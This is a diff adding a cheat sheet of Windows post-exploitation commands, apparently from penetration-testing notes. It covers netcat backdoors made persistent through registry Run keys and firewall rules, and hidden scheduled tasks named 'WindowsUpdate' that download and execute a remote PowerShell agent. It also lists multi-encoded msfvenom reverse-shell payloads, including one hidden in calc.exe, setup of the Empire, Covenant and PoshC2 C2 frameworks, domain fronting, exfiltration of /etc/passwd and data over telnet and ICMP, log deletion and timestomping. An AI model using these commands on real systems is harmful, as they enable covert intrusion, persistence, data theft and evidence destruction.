@@ -1,0 +1,56 @@
+meterpreter> upload /usr/share/windows-binaries/nc.exe C:\WINDOWS\system32
+meterpreter> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 8888 -e cmd.exe
+meterpreter> reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
+C:\Windows\system32>netsh advfirewall firewall add rule name="svchostpassthrough" dir=in action=allow protocol=TCP localport=8888
+C:\windows\system32>netsh advfirewall firewall show rule name="svchostpassthrough"
+meterpreter> reboot
+C:\windows\system32> shutdown /r /t 15
+cryptcat -k password -l -p 444
+cryptcat -k password <listener IP address> 444
+
+schtasks /create /tn WindowsUpdate /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('http://10.10.10.12:90/agent.ps1'))'" /sc onlogon /ru System
+schtasks /create /tn WindowsUpdate /tr  "'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c IEX ((new-object net.webclient).downloadstring('http://10.10.10.12:90/agent.ps1'))''" /sc onstart
+schtasks /create /tn WindowsUpdate /tr  "'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c IEX ((new-object net.webclient).downloadstring('http://10.10.10.12:90/agent.ps1'))''" /sc onidle /i 10
+
+meterpreter>run multi_console_command -rc /root/.msf4/logs/persistence/<Location>.rc
+
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<Kali IP> lport=443 -e x86/shikata_ga_nai -i 5 -f exe -o attack1.exe
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<Kali IP> lport=443 -e x86/shikata_ga_nai -i 8 raw | msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 9 -f exe -o multiencoded.exe
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=<Kali IP> lport=443 -x /root/calc.exe -k -e x86/shikata_ga_nai -i 10 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 9 -f exe -o calc.exe
+
+#Dropbox - Empire
+          listeners
+          uselistener dbx
+          set apitoken <yourapitoken>
+          usestager multi/launcher dropbox
+          execute
+
+#Convenant
+
+sudo git clone --recurse-submodules https:// github.com/cobbr/Covenant
+sudo wget https://packages.microsoft.com/config/ debian/10/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
+sudo dpkg -i packages- microsoft-prod.deb
+sudo apt-get update && sudo apt-get install -y apt-transport-https && sudo apt-get update && sudo apt-get install -y dotnet-sdk-3.1
+cd Covenant/Covenant
+sudo dotnet build 
+sudo dotnet run
+
+#poschC2
+
+sudo git clone --recursive (https://github.com/nettitude/PoshC2) 
+cd PoshC2 
+sudo ./Install.sh
+posh-project –n nameoftheproject
+
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https lhost=<VULNERABLEHOST> lport=443 httphostheader=< CloudFront address> -ex86/shikata_ga_nai -i 8 raw | msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | msfvenom -a x86 --platform windows -e x86/bloxor -i 9 -f exe -o Domainfront.exe
+nc -lvp 2323 > Exfilteredfile
+cat /etc/passwd | telnet remoteIP 8000
+
+
+tcpdump -i eth0 'icmp and src host <KALI IP>' -w importantfile.pcap
+tshark -n -q -r importantfile.pcap -T fields -e data.data | tr -d "\n" | tr -d ":" >> extfilterated_hex.txt
+
+C:\> del %WINDIR%\*.log /a/s/q/f
+meterpreter > timestomp -z "01/01/2001 10:10:10" README.txt
+meterpreter> timestomp C:\\ -r
+
